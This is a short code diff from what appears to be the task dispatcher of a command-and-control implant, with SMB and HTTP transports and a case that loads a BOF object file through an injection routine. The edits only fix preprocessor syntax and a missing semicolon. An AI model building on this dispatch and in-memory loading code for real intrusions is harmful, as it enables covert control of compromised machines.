@@ -146,12 +146,11 @@ namespace Dispatcher {
         _parser parser  = { };
 
         retry:
-
         if (!Ctx->Transport.OutboundQueue) {
 
-#ifdef TRANSPORT_SMB
+#if defined(TRANSPORT_SMB)
             return_defer(ERROR_SUCCESS);
-#elifdef TRANSPORT_HTTP
+#elif defined(TRANSPORT_HTTP)
             PSTREAM entry = Stream::CreateStreamWithHeaders(TypeTasking);
 
             OutboundQueue(entry);
@@ -258,7 +257,7 @@ namespace Dispatcher {
             }
             case TypeObject: {
                 // load a BOF file
-                Injection::LoadObject(parser)
+                Injection::LoadObject(parser);
             }
 
             default:
